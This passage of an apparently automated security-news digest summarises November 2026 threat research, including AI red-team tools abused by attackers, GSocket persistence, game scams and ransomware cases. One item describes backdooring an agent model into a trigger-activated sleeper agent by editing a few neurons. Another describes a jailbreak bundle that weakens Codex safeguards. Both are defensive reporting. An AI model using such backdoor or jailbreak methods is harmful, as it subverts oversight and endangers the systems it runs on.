  - Summary: OpenAI is bringing AI agents into more of the software security process with Daybreak, pairing web application penetration testing with tools that investigate vulnerabilities and develop fixes. The two offerings, Red Team and Defense Factory, connect the work of finding security weaknesses with patching and retesting them. Red Team tests applications and verifies fixes Daybreak Red Team, offered through an early-access program, uses coordinated agents to examine application source code and context, investigate potential attack … More → The post OpenAI’s Daybreak brings AI agents to security testing and vulnerability fixes appeared first on Help Net Security .
- **Just Security** (policy_strategy_geopolitics)
  - Title: Just the Docs: Nonprofits Sue Five Frontier AI Companies to Freeze Development, Citing Cyberattack and Catastrophic Risks
  - Published: 2026-11-13T20:51:22+00:00
  - Link: https://www.justsecurity.org/164494/nonprofits-lawsuit-freeze-frontier-ai-development/?utm_source=rss&utm_medium=rss&utm_campaign=nonprofits-lawsuit-freeze-frontier-ai-development
  - Summary: Four nonprofits sue Anthropic, Google, Meta, OpenAI, and SpaceXSI seeking to freeze frontier AI development over cyberattack and catastrophic risks. The post Just the Docs: Nonprofits Sue Five Frontier AI Companies to Freeze Development, Citing Cyberattack and Catastrophic Risks appeared first on Just Security .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Anthropic's Claude Fable 5.2 Beats GPT-6 Cyber in Multi-Stage Cyberattack Benchmark
  - Published: 2026-11-10T08:16:14+00:00
  - Link: https://thehackernews.com/2026/11/anthropics-claude-fable-52-beats-gpt-6.html
  - Summary: Anthropic on Monday released Claude Fable 5.2 and Claude Mythos 5.2 models, which it said exhibit improvements in coding, reasoning, and vision. During pre-release training, the large language models (LLMs) helped its engineers "complete otherwise-infeasible software migrations, designed three working electronic devices from scratch, solved two open problems in the physics of black holes, made

### Cluster 467554e7d8 — score 10

- Title: ARTEX and AI-Powered Red Teaming Tools: What Defenders Need to Know
- Source: Unit 42 (threat_research_primary)
- Published: 2026-11-11T23:00:53+00:00
- Link: https://unit42.paloaltonetworks.com/artex-and-ai-powered-red-teaming-tools/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: retail_ecommerce
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: retail_ecommerce
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Learn what Unit 42 discovered about attacker use of AI-powered red team tools, and how to mitigate these attacks. The post ARTEX and AI-Powered Red Teaming Tools: What Defenders Need to Know appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Insights General General ARTEX and AI-Powered Red Teaming Tools: What Defenders Need to Know 6 min read Related Products Cortex Cortex XDR Cortex XSIAM Unit 42 Deep and Dark Web Service Unit 42 Incident Response Unit 42 Threat Intelligence Services By: Cuong Dinh Richard Emerson Samantha Stallings Ofek Lahiani Ben Magee Published: November 11, 2026 Categories: General Insights Tags: GenAI LLM Penetration testing Share A rapidly expanding ecosystem of AI-enabled tools such as ARTEX and CyberStrikeAI — marketed for red teaming and penetration testing — are being used by attackers to execute offensive operations autonomously. Their footprint is already substantial. Unit 42 has observed ARTEX used in intrusion attempts against multiple targets . Our Incident Response team investigated multiple intrusions in which the attacker’s server hosted an ARTEX console or used infrastructure and user agents associated with ARTEX. Separately, Unit 42 Managed Threat Hunting tracked a coordinated ARTEX campaign against customer cloud environments in sectors worldwide, including retail and consulting. External scrutiny has already disrupted project lifecycles: the author of ARTEX recently made the repository closed-source and ceased public development to prevent misuse . Emerging alternatives are rapidly filling the void, introducing new capabilities that threat actors will inevitably co-opt. Here, we share our observations of how attackers are using AI-powered red team tools, along with our recommendations for how defenders can mitigate. Why Is ARTEX Such an Effective Tool for Attackers? ARTEX and other red-teaming platforms are free, quick to deploy and need little more than access to a large language model (LLM). ARTEX is an open-source, multi-agent AI penetration testing framework first published in mid-2026. It has been widely forked since. Attackers can use ARTEX to evaluate responses, adapt when something fails and keep pursuing their objective. They can target the identity workflows and APIs that organizations expose to the internet, and then use the associated credentials and trust relationships to reach the cloud. AI-Powered Red Teaming and Pentesting Ecosystem Infrastructure As of October 2026, Unit 42 identified 1,323 internet-facing hosts running CyberStrikeAI and 609 running ARTEX. Notably, 21 hosts were running both at the same time. Unit 42 analyzed 14 tools across the pentesting and red-teaming tool ecosystem, highlighting 12 emerging tools alongside CyberStrikeAI and ARTEX. These tools can be broken down into four categories of AI assisted red team activities. Category Tools Goal Reconnaissance and attack-surface management ARL, ARL-Next, Scope Sentry, Nemo, XingRin, OpenEASD Identify what assets exist, what is exposed and what changes Agent-led testing and vulnerability hunting CyberStrikeAI, ARTEX, Cairn, PentAGI, AutoHunter Manage what should be investigated and how the system can act on it Source-code auditing and verification DeepAudit, AIxVuln Identify where source code might be vulnerable and what supports that finding AI-system security assessment AI-Infra-Guard Identify if AI infrastructure, agents, tools and model interfaces are vulnerable or unreliable Table 1. Tool categories. Implications For Defenders Defenders should be aware of the following implications of AI-powered red teaming platforms: Lowered Skill Floor for Attackers Adversaries no longer require specialized tradecraft to execute multi-stage, adaptive penetration testing. Off-the-shelf tooling combined with LLMs like DeepSeek allows financially motivated actors to launch and manage dozens of complex, concurrent network intrusions for minimal compute cost. Risk of Internet-Exposed Assets Any internet-exposed asset, regardless of organizational size or sector, is equally likely to be impacted by automated, persistent intrusion attempts. Attackers using the autonomous AI penetration testing framework ARTEX are turning public password r
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: ARTEX and AI-Powered Red Teaming Tools: What Defenders Need to Know
  - Published: 2026-11-11T23:00:53+00:00
  - Link: https://unit42.paloaltonetworks.com/artex-and-ai-powered-red-teaming-tools/
  - Summary: Learn what Unit 42 discovered about attacker use of AI-powered red team tools, and how to mitigate these attacks. The post ARTEX and AI-Powered Red Teaming Tools: What Defenders Need to Know appeared first on Unit 42 .

### Cluster 5b374473ad — score 10

- Title: The global socket: how threat actors are weaponizing GSocket for stealthy C2
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-11-11T19:49:57+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Microsoft Defender
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_products: Microsoft Defender
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Threat actors are deploying GSocket on compromised Linux servers to keep encrypted remote access after the original vulnerability is patched. Learn how to detect, investigate, and remediate this activity. The post The global socket: how threat actors are weaponizing GSocket for stealthy C2 appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Linux Threats intelligence Cyberattacker techniques, tools, and infrastructure Vulnerabilities and exploits Content types Research Products and services Microsoft Defender Topics Actionable threat insights Threat intelligence Microsoft observed multiple incidents in which threat actors deployed GSocket, an open source remote access tool, on compromised Linux servers. Threat actors used Gsocket to maintain access even after the vulnerabilities used for initial compromise were remediated. This turned a single web application compromise into persistent access that outlasted the remediation of the original vulnerabilities. Defenders investigating affected hosts should look for evidence of GSocket deployment, persistence, privilege escalation, and outbound connections, rather than treating application patching alone as complete remediation. Microsoft Defender for Endpoint telemetry shows this activity growing over recent months and concentrated on web applications and hosting environments. GSocket relays traffic through a shared public network, so there is no threat actor-owned IP address or domain to block. When one RCE stops being just one RCE Exploiting a web application vulnerability gives a threat actor command execution in the context of the web server process. That access lasts only while the vulnerability remains unpatched and the service keeps running. Patching the application or restarting the service can remove it. To keep access, threat actors typically add a persistence mechanism, and each common option has drawbacks. SSH keys added to authorized_keys are easy for administrators to find during an audit. Reverse shells depend on threat actor-controlled servers that defenders can block or sinkhole. Custom implants require ongoing development and maintenance. The same trade-offs apply when initial access comes through remote access services or cloud shell sessions. GSocket addresses these drawbacks, which helps explain why multiple unrelated threat actors have adopted it. Shared relay infrastructure. Traffic passes through the Global Socket Relay Network, a public relay service. The threat actor does not register or host any infrastructure, so there is no threat actor-owned IP address or domain to block. Organizations can still restrict access to the relay itself. Outbound-only connections. The compromised host and the operator both connect outbound to the relay, which bridges the two sessions. The host needs no inbound listener or public IP address, and network address translation does not prevent the connection. Inbound firewall rules do not see this traffic, although egress filtering and outbound monitoring can. Built-in evasion and persistence. The deployment script can rename the process, stage files in memory-backed directories, and install persistence that survives a reboot, without additional development by the threat actor. The same relay model that supports legitimate remote administration also gives threat actors a way to maintain access without operating dedicated C2 infrastructure. Once GSocket runs on a compromised server, the server and the operator each connect outbound to the Global Socket Relay Network, which pairs the two sessions over an end-to-end encrypted channel. Figure 1: After code execution on an internet-facing application, GSocket is deployed and both ends connect outward to the relay. Because GSocket runs independently of the exploited application, patching the vulnerability does not remove the relay client or its persistence. Microsoft Defender for Endpoint telemetry shows that this activity is not limited to a single compromise. From March through August 2026, devices with GSocket-related detections increased 356.2%, although the increase was not consistent month to month. Figure 2: Growth in GSocket-related detections from March to August, measured against the March baseline. Web applications and hosting accounted for 87.1% of attributable Microsoft Def
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: The global socket: how threat actors are weaponizing GSocket for stealthy C2
  - Published: 2026-11-11T19:49:57+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
  - Summary: Threat actors are deploying GSocket on compromised Linux servers to keep encrypted remote access after the original vulnerability is patched. Learn how to detect, investigate, and remediate this activity. The post The global socket: how threat actors are weaponizing GSocket for stealthy C2 appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: The global socket: how threat actors are weaponizing GSocket for stealthy C2
  - Published: 2026-11-11T19:49:57+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/
  - Summary: Threat actors are deploying GSocket on compromised Linux servers to keep encrypted remote access after the original vulnerability is patched. Learn how to detect, investigate, and remediate this activity. The post The global socket: how threat actors are weaponizing GSocket for stealthy C2 appeared first on Microsoft Security Blog .

### Cluster 6cd0ca5dbb — score 10

- Title: Detecting sleeper agents hiding in AI model neurons
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-11-10T23:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/11/10/detecting-sleeper-agents-hiding-in-ai-model-neurons/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_products: Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_products: Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft Research has released new threat research detailing how a capable agent model could be turned into a sleeper agent by editing fewer than ten neurons to inject a short payload; Microsoft Research has also found that this threat is detectable by frontier agents, which can identify anomalous weight edits. The post Detecting sleeper agents hiding in AI model neurons appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Threats intelligence AI threats Content types Research Topics Threat intelligence Microsoft Research has released new threat research detailing how a capable agent model could be turned into a sleeper agent by editing fewer than 10 neurons to inject a short payload. The sleeper agent passes all evaluations, but when a trigger string appears in its context, the agent runs an attacker’s command. And because agents now frequently run unattended with privileged system access, the integrity of model weights is a security concern for both third-party models and internally developed models. Key findings from Microsoft Research include: Software abuse and manipulation are familiar threats. For AI models and agents, enterprises need independent observability and other controls to continuously monitor performance, detect unintended or malicious activity, and manage risk. Satya Nadella recently outlined this approach in a blog post . A backdoored model can pass evaluations. When it emits the attacker’s command on cue, the agent runs the command with whatever access it has in the environment. The attack needs inference-only compute. If a machine has enough RAM to run a model, it has enough resources to weight-space backdoor it. Claude Code with Opus 4.5 discovered most of this threat autonomously. Microsoft has not observed any threat actors weaponizing this technique. However, this research aligns with similar recent research by Anthropic and MIT on agentic backdoors and weight-space programming, respectively, highlighting the need to audit open weights like code. Notably, Microsoft Research has also found that this threat is detectable by frontier agents, which can identify anomalous weight edits. Using frontier agents as auditors can help automate the defense against this threat. More broadly, Microsoft Research’s approach demonstrates an adaptable process for securing AI agents: agents surface new security problems, and human researchers then systematize, study, and mitigate them. Learn more from the Microsoft Research Blog: Lazare, veni foras: Reprogramming dormant neurons to backdoor AI agents Mitigation and protection guidance Microsoft recommends the following mitigations to defend against this threat as part of a broader defense-in-depth approach. The guidance is grouped by control objective so that model owners, platform teams, and security operations can each find their actions. Audit model weights before deployment and after every update Diff every checkpoint against its declared base model before deployment and after each update. Legitimate fine-tunes and quantized versions change weights broadly and diffusely, while implanted neurons tend to change a few weight vectors by a large amount. Flag tensors or rows whose change is a statistical outlier relative to the rest of the diff and reject models that do not declare a verifiable base. Use frontier AI agents as auditors in the model intake pipeline. Microsoft Research found they are highly effective at finding anomalous structure in weights that manual inspection misses, which makes this step automatable at scale. Complement weight diffing with behavioral backdoor scanning of open-weight models, as described in Microsoft’s research on detecting backdoored language models at scale . Record audit results alongside the model in the registry, and state clearly to internal consumers that passing an audit reduces risk but does not guarantee safe behavior. Secure model hubs and publishers Display provenance and audit status publicly before a checkpoint can be downloaded or served through an API. Scan every upload for anomalous neurons, weight patterns or behaviors, and state clearly that third-party checkpoints can be unsafe and that passing an audit does not guarantee safe behavior. Treat every third-party model as untrusted until audited Source checkpoints only from the original publisher, verify the publisher’s published file hashes, and treat all t
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Detecting sleeper agents hiding in AI model neurons
  - Published: 2026-11-10T23:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/11/10/detecting-sleeper-agents-hiding-in-ai-model-neurons/
  - Summary: Microsoft Research has released new threat research detailing how a capable agent model could be turned into a sleeper agent by editing fewer than ten neurons to inject a short payload; Microsoft Research has also found that this threat is detectable by frontier agents, which can identify anomalous weight edits. The post Detecting sleeper agents hiding in AI model neurons appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Detecting sleeper agents hiding in AI model neurons
  - Published: 2026-11-10T23:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/11/10/detecting-sleeper-agents-hiding-in-ai-model-neurons/
  - Summary: Microsoft Research has released new threat research detailing how a capable agent model could be turned into a sleeper agent by editing fewer than ten neurons to inject a short payload; Microsoft Research has also found that this threat is detectable by frontier agents, which can identify anomalous weight edits. The post Detecting sleeper agents hiding in AI model neurons appeared first on Microsoft Security Blog .

### Cluster 568f4783d6 — score 10

- Title: LABScon26 Replay | Let’s Get Physical: Why Cybersecurity Needs Hardware-Based Security to Survive AI
- Source: SentinelOne Labs (threat_research_primary)
- Published: 2026-11-12T14:00:02+00:00
- Link: https://www.sentinelone.com/labs/labscon26-replay-let-s-get-physical-why-cybersecurity-needs-hardware-based-security-to-survive-ai/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Adyen’s Dino Dai Zovi shows how hardware security proven in payments can contain AI-driven attacks, even when vulnerabilities cannot be patched.
```

#### Corroborating sources (1)

- **SentinelOne Labs** (threat_research_primary)
  - Title: LABScon26 Replay | Let’s Get Physical: Why Cybersecurity Needs Hardware-Based Security to Survive AI
  - Published: 2026-11-12T14:00:02+00:00
  - Link: https://www.sentinelone.com/labs/labscon26-replay-let-s-get-physical-why-cybersecurity-needs-hardware-based-security-to-survive-ai/
  - Summary: Adyen’s Dino Dai Zovi shows how hardware security proven in payments can contain AI-driven attacks, even when vulnerabilities cannot be patched.

### Cluster e260def6a2 — score 10

- Title: GTA VI isn’t out yet – and the scams are already in full swing
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-11-13T10:00:00+00:00
- Link: https://www.welivesecurity.com/en/cybersecurity/gta-vi-isnt-out-yet-scams-full-swing/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Cybercriminals attempt to cash in on the hype around the game, luring fans with malware-laced downloads and ‘early access’ that doesn’t exist
```

#### Full body

```
Digital Security GTA VI isn’t out yet – and the scams are already in full swing Cybercriminals attempt to cash in on the hype around the game, luring fans with malware-laced downloads and ‘early access’ that doesn’t exist Editor 13 Nov 2026 • , 13 min. read On November 19 th , 2026, Grand Theft Auto VI will be released for PlayStation 5 and Xbox Series X|S. But cybercriminals aren’t waiting for launch day. They have long been capitalizing on the hype around what’s arguably the most anticipated game of the decade, using fake leaks, malware-laced downloads, bogus online stores with rock-bottom prices, and fraudulent “early access” schemes to lure eager fans. Security experts at ESET expect such scams to proliferate as the release approaches and the holiday shopping season gets underway. Key points of this blogpost: GTA VI launches on November 19 th , 2026, for PlayStation 5 and Xbox Series X|S. Rockstar hasn’t announced a PC version, playable demo, beta, or early-access program. Fake GTA VI downloads can pose a serious security risk. Researchers found installers and “leaked” builds that carry infostealers, remote-access trojans, and destructive malware. A convincing storefront doesn’t guarantee a legitimate offer. Be wary of unusually low prices, cryptocurrency-only payments, and offers of a PC version or early access that contradict Rockstar’s official information. The risks are likely to shift around launch and the holiday shopping season , with pre-load scams, fake gift cards and bundles, and eventually bogus cheats, mods, and “PC version” downloads providing new lures. What’s real: the official facts It’s easy to see why the franchise makes such an attractive lure: Grand Theft Auto is one of the most successful entertainment properties of all time, with more than 470 million units sold worldwide, according to Rockstar Games. Before taking a closer look at the scams tied to GTA VI, let’s establish what Rockstar has actually announced. Pre-orders opened on June 25 th . According to Rockstar Games’ official pre-order announcement , the Standard Edition is priced at $79.99 in the United States, while the Ultimate Edition costs $99.99. Players who pre-order a digital copy have been able to pre-load the game since November 10 th . What Rockstar has not announced is just as important, particularly with so many fraudulent offers circulating online: there is currently no official beta, playable demo, or early-access program that would let players start playing GTA VI before release day. Nor has Rockstar announced a PC version, PC release date, or system requirements. This makes the official information a useful reality check: offers built around a supposed PC version, beta, demo, or early access are promising something Rockstar has never confirmed. Table 1. GTA VI scams at a glance Scam type What to watch out for What attackers are after Credential phishing Fake Rockstar, PlayStation, Xbox, or Steam login pages Gaming-account credentials, passwords, and other personal information Fake beta or early access Invitations to register, log in, pay a fee, or download software to access a nonexistent GTA VI beta, demo, or early-access version Credentials, money, personal data, or malware installation Crypto scams Fake GTA VI giveaways, token airdrops, investment opportunities, or “VIP access” requiring cryptocurrency Cryptocurrency payments or access to victims’ crypto assets Fake stores and pre-orders Cloned or impersonating storefronts offering GTA VI copies, keys, bundles, or versions that have not been officially announced Payment-card details, personal information, or direct payments Malware delivery Fake launchers, leaked builds, beta installers, APKs, cracks, cheats, or preload tools Installation of infostealers, remote-access trojans, or other malware Leaks fuel the hype The enormous anticipation for GTA VI has also made every new leak a magnet for attention. On August 18 th , an entity calling itself CyberLeek began releasing what i
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: GTA VI isn’t out yet – and the scams are already in full swing
  - Published: 2026-11-13T10:00:00+00:00
  - Link: https://www.welivesecurity.com/en/cybersecurity/gta-vi-isnt-out-yet-scams-full-swing/
  - Summary: Cybercriminals attempt to cash in on the hype around the game, luring fans with malware-laced downloads and ‘early access’ that doesn’t exist

### Cluster be0ba4d322 — score 10

- Title: 9th November – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-11-09T16:15:41+00:00
- Link: https://research.checkpoint.com/2026/9th-november-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, supply_chain, web_shell_backdoor
- affected_industries: financial_services
- affected_products: SonicWall
- cve_ids: CVE-2026-111560, CVE-2026-116606, CVE-2026-19868, CVE-2026-58868
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, web_shell_backdoor
- affected_industries: financial_services
- affected_products: SonicWall
- cve_ids: CVE-2026-19868, CVE-2026-58868, CVE-2026-116606, CVE-2026-111560
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 9th November, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Queens Public Library, a New York City public library system serving approximately 2.3 million residents, was struck by a ransomware attack that encrypted its systems. The incident disrupted public computers, Wi-Fi, checkout […] The post 9th November – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 9th November – Threat Intelligence Report November 9, 2026 https://research.checkpoint.com/2026/9th-november-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 9th November, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Queens Public Library, a New York City public library system serving approximately 2.3 million residents, was struck by a ransomware attack that encrypted its systems. The incident disrupted public computers, Wi-Fi, checkout equipment, digital media services, and its mobile application, while all 66 branches remained open. Russian web hosting provider Beget sustained a destructive cyberattack on November 1 that wiped data across its cloud infrastructure and disrupted hundreds of websites. The attack affected businesses and public services, with more than 1,000 servers requiring manual inspection before restoration. Some backup data was reportedly destroyed. OPSSHIELD, developer of the Linux security tool cPGuard, disclosed a supply-chain attack after compromised credentials enabled attackers to distribute malicious updates on November 2. Approximately 2,950 customer servers executed the malicious script, which installed a backdoor and collected password hashes, credentials, and sensitive server files. Ukraine’s Air Alert app, an emergency notification service used by millions, was compromised by attackers who distributed false radiation, chemical-threat, and military alerts to Kyiv residents. Developers temporarily suspended notifications. A separate attack affected Russia’s emergency alert application, although both countries reported that their core warning systems remained operational. AI THREATS Check Point Research documented cybercriminals using ARTEX, an AI-powered framework that autonomously discovers and exploits vulnerable systems. Researchers identified 1,608 live, publicly accessible instances. Observed campaigns obtained more than 300 iOS signing certificates and harvested approximately 190,000 gaming credentials, including around 6,000 active accounts. Check Point Research identified Haiou, a jailbreak bundle targeting OpenAI Codex that weakens safeguards and modifies agent instructions to promote an external AI gateway. The package also installs security-related capabilities and appeared on infrastructure associated with cybercrime tools, although researchers did not establish that its developers intended criminal use. India’s Computer Emergency Response Team identified Crafty Falcon, a threat actor using AI-assisted tools to target financial services and cryptocurrency businesses. Attackers exploited connections between testing and production environments, abused payment APIs, and stole wallet credentials. AI tools helped generate tailored attack scripts and automate complex intrusion sequences. VULNERABILITIES AND PATCHES SonicWall patched CVE-2026-19868, a high-severity vulnerability affecting SonicOS SSL VPN services configured with SAML authentication. Attackers possessing valid credentials for an alternative authentication method could bypass SAML controls, including multi-factor authentication. The vulnerability has been linked to active exploitation and affects enterprise firewall environments. Google published November’s Android Security bulletin, addressing numerous vulnerabilities across Android components. Among the flaws patched is CVE-2026-58868, a critical vulnerability affecting Android versions 14 through 17 that could allow remote code execution without user interaction. Barracuda patched CVE-2026-116606 and CVE-2026-111560, two high-severity vulnerabilities affecting its Email Security Gateway appliances. Attackers with access to the administrative interface could chain an authentication bypass with command injection to gain root-level control without logging in. The flaws received CVSS scores of 9.3 and 8.6, respectively. OpenSSH addressed CV
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 9th November – Threat Intelligence Report
  - Published: 2026-11-09T16:15:41+00:00
  - Link: https://research.checkpoint.com/2026/9th-november-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 9th November, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Queens Public Library, a New York City public library system serving approximately 2.3 million residents, was struck by a ransomware attack that encrypted its systems. The incident disrupted public computers, Wi-Fi, checkout […] The post 9th November – Threat Intelligence Report appeared first on Check Point Research .

### Cluster a46657a5b4 — score 10

- Title: Ransomware at the hypervisor layer: how attackers use ESXi and vCenter features for malicious purposes
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-11-13T09:00:43+00:00
- Link: https://securelist.com/esxi-ransomware/121959/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- actor_attribution: LockBit
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- actor_attribution: LockBit
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky experts analyze a recent ransomware incident and discuss why the hypervisor layer remains difficult to monitor, what common access paths adversaries use to reach it, and how to protect your ESXi systems.
```

#### Full body

```
Content menu Close Subscribe Threat Response Table of Contents Why the hypervisor changes ransomware economics The visibility asymmetry How attackers reach the virtualization layer Vulnerability exploitation Active Directory integration Recommendation for defenders Credential reuse from the Windows estate Backup infrastructure as a credential bridge Persistence on the management plane Turning vCenter into an offensive control plane Why ESXi configuration change via vCenter is a trust-boundary failure High-fidelity detection opportunity Notes on ESXi abuse: living-off-the-land tools and controls to monitor Inside the ESXi impact phase Stopping virtual machines before impact Payload delivery and FlowSsh behavior The three-hour self-test window Pre-impact detection opportunity Detonation command and evidence confidence Partial overwrite and what 2 KB actually implies Destroying the recovery path first Detection and investigation High-confidence detection opportunities Example correlation logic Incident response at the virtualization layer First 30 minutes after incident discovery Containment priorities Architecture hardening derived from the case Treat vCenter as Tier 0 Separate virtualization identities from ordinary enterprise administration Keep direct ESXi management paths narrow Make the logging path independent of the affected host Design backup as a separate security boundary Conclusion MITRE ATT&CK mapping Incident indicators Minimum virtualization forensic collection set Authors Elsayed Elrefaei Mohamed Ghobashy Our Global Emergency Response Team (GERT) recently investigated an engagement in which an adversary destroyed an organization’s virtualization estate over a 10-day period. The campaign targeted four ESXi hosts, every virtual machine hosted on them, both vCenter Server Appliances, and all connected backup infrastructure. The ransom notes identified the attacker as the BlackNevas group, first observed in November 2024. What’s interesting about this attack is that no virtualization layer vulnerabilities were exploited: no guest-to-host escapes, no hypervisor memory corruption. Every action taken against ESXi was executed through legitimate VMware management interfaces. In September 2021, the Babuk ransomware source code was leaked online, including its ESXi version, which made ESXi ransomware accessible to cybercriminals with relatively low technical skills. At least ten subsequent ransomware families have leveraged this leaked code, including groups that otherwise lacked the expertise to develop ESXi-compatible ransomware lockers from scratch. We saw multiple operators using Babuk-derived ESXi lockers along with the leaked LockBit Windows builds. It is worth noting that while the Babuk ESXi version may target both old and up-to-date systems, the target organizations run unsupported ESXi versions, making them easier to attack. This article examines why the hypervisor layer remains difficult to monitor, what common access paths adversaries use to reach it, and how they establish persistence on the management plane. We’ll also look into the architecture of ESXi encryptors, the deliberate destruction of backup infrastructure, and the log sources that enable post-incident reconstruction. At the end of this article, we’ll provide indicators of compromise recovered during the investigation. Ten days of dwell time from initial access to the destructive phase. Timeline reconstructed from incident evidence Why the hypervisor changes ransomware economics Virtualization enables cost-effective and efficient resource management, simplifies simultaneous updates and policy enforcement. However, at the same time it reduces the number of control points and enables broader impact in case of a cyberattack. In non-virtualized environments, a single guest compromise normally affects one operating system. Compromise of the virtualization management plane gives the attacker access to many hypervisor hosts, while direct impact on an ESXi d
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Ransomware at the hypervisor layer: how attackers use ESXi and vCenter features for malicious purposes
  - Published: 2026-11-13T09:00:43+00:00
  - Link: https://securelist.com/esxi-ransomware/121959/
  - Summary: Kaspersky experts analyze a recent ransomware incident and discuss why the hypervisor layer remains difficult to monitor, what common access paths adversaries use to reach it, and how to protect your ESXi systems.

### Cluster ec59c47880 — score 10

- Title: Citrus Ransomware: VLESS for traffic, Sn00py for encryption, and LLMs lending a hand
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-11-11T10:00:25+00:00
- Link: https://securelist.com/citrus-ransomware/121879/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- cve_ids: CVE-2026-54121
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- cve_ids: CVE-2026-54121
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
We break down the Citrus Ransomware group's attacks: the attackers' TTPs and tooling, including VLESS traffic tunneling and LLM use, plus their links to Toy Ghouls.
```

#### Full body

```
Content menu Close Subscribe Threat Response Table of Contents Initial Access: attacks through contractors Execution: commands, LLMs, and Impacket Persistence: scheduled tasks Privilege Escalation: vulnerabilities and configuration flaws Stealth: covering tracks and masquerading Defense Impairment: weak access policies for security tools play into attackers’ hands Credential Access: mimikatz, a keylogger, and extraction of credentials from files Discovery: the standard toolkit Local discovery Remote discovery Lateral Movement: SSH, RDP, and WinRM Command and Control: delivering tools to the system Creating tunnels with Xray Installing AnyDesk Collection & Exfiltration: data from messaging apps Impact: Sn00py ransomware Trojan Links to Toy Ghouls Conclusion Indicators of compromise Authors Stanislav Larinsky Vladislav Vlasov Boris Trefilov In recent years, cyberthreats have increasingly taken a hybrid approach, combining time-tested techniques for advancing through infrastructure, modern methods of evading network filters, and automation powered by large language models. This is also the approach of Citrus Ransomware, a previously undocumented group whose toolset includes VLESS tunnels (used to disguise traffic as regular HTTPS) and a ransomware Trojan from the Sn00py family. The attackers also integrate LLMs (large language models) into the process of infrastructure compromise. In this article, we review the tactics and techniques the group used in recent incidents. Initial Access: attacks through contractors The attackers gain initial access to victims’ infrastructure through compromised contractors. They use credentials stolen from these 